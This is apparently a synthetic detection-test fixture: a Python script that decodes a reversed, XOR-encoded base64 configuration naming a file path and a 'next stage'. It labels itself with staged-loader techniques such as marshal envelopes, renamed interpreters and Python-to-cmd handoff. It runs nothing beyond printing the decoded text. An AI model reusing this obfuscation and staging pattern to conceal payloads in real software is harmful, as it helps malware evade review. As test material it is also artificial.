# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_9fd1b38d = "Rk8RW1pNWklQXFpNEk1aU1NeS0xRVkZPEk1QUk1eRk8CWlheS0xgS0daUUNGTxEGCg8MXgdeWgwNElpLXltPShEQXV5zTExaTUtRSncQXktee1JeTVhQTW8QBXwCV0teT2BaU1ZZQwYKDwxeB15aDA0SUVhWXk9SXlwCW1ZgUVhWXk9SXlxDTVpLWk1PTVpLUVZgW1pSXlFaTQJRVl5XXGBMSFBbUVZIQ1pSVktRSk1gUVBXS0ZPYFpTXV5bW1pdUloCTVpWTU1eXENRXlNPYFpPUFNaSVFaYFNeV0xNXlICUVBWS15cTEpZXVBDW1BXS1pSXFZLXktMYExMXlNcAkdeS1FGTEMMAktRSlBcYFpYXktMQ1tSXGBQS2BRUFdLRk8CTVpLT15bXkNaWF5LTGBLR1pRYFdcS15PTFZbE01aS1pNT01aS1FWYFpLXlxQUxNRUFZLXk1KWFZZUVBcYFpbUFxaWwJMT1pLTEMNAkk="
CODEC_9fd1b38d = "base64_literal|reverse_then_xor|3f"

def load_9fd1b38d():
    return base64.b64decode(MATERIAL_9fd1b38d)

def decode_9fd1b38d(stored_bytes):
    return bytes(value ^ 63 for value in reversed(stored_bytes))

def recover_9fd1b38d():
    harmless_value = "left" if 2 > 1 else "right"
    _pass = 0
    while _pass < 1:
        recovered_bytes = decode_9fd1b38d(load_9fd1b38d())
        _pass += 1
    configuration_text = recovered_bytes.decode("ascii", "strict")
    return configuration_text

def inspect_9fd1b38d():
    view = memoryview(recover_9fd1b38d().encode("ascii"))
    return bytes(view).decode("ascii")

class Surface_surface_9fd1b38d:
    @staticmethod
    def recover():
        return ("class_staticmethod", "marshal_envelope_plan", "embeddable_python_runtime", "renamed_interpreter")

def surface_9fd1b38d():
    return Surface_surface_9fd1b38d.recover()

def obfuscation_9fd1b38d():
    marshal_plan = {"format": "code_object", "action": "inspect_only", "label": "marshal_envelope_plan"}
    return marshal_plan["label"]

def plan_9fd1b38d():
    fields = dict(item.split("=", 1) for item in inspect_9fd1b38d().split("|"))
    analysis_surface = surface_9fd1b38d()
    obfuscation_surface = obfuscation_9fd1b38d()
    operation_plan = ("python_to_cmd", fields["file_path"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_9fd1b38d())

# reconstruction complete